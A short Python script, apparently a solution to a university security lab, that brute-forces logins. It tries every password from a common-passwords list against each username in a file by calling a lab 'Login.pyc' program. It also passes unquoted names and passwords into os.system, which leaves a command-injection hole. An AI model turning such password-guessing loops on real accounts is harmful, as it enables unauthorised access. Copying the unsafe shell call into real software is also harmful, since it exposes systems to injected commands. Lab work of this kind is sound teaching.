# import time
# import os
# import subprocess

# if __name__ in '__main__':
#     start_time = time.time()
#     common_passwords=[i.strip() for i in open('/home/cse/Lab1/MostCommonPWs.txt')]
#     gang_names=[i.strip() for i in open('gang.txt')]

#     for name in gang_names:
#         for i in common_passwords:
#             res = subprocess.run(['python3', './Login.pyc', name, i], stdout=subprocess.PIPE, stderr=subprocess.PIPE,text=True)
#             if res == "Success: correct userid and password!\n":
#                 print(name, i, "--- %s seconds ---" % (time.time() - start_time))
#                 break


import time
import os

if __name__ in '__main__':
    start_time = time.time()
    common_passwords=[i.strip() for i in open('/home/cse/Lab1/MostCommonPWs.txt')]
    gang_names=[i.strip() for i in open('/home/cse/Lab1/gang.txt')]

    for name in gang_names:
        for i in common_passwords:
            res = os.system('python3 ./Login.pyc'+ ' ' + name + ' ' + i + " >/dev/null 2>&1")
            if res == 0:
                print(name, i, "--- %s seconds ---" % (time.time() - start_time))
                break
        if res != 0:
            print(name,' ?')


